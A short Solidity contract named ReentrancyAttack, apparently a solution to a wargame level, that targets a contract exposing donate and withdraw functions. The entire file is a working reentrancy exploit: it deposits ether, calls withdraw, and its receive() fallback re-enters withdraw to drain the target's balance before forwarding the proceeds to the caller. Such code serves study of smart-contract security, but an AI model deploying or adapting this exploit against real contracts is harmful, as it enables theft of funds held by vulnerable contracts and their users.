//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    constructor() { }

    function attack(address _target) public payable {
        Reentrance(_target).donate{value:msg.value}(address(this));
        Reentrance(_target).withdraw(msg.value);
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        if (address(this).balance >= 0.1 ether){
            Reentrance(msg.sender).withdraw(msg.value);
        }
    }
}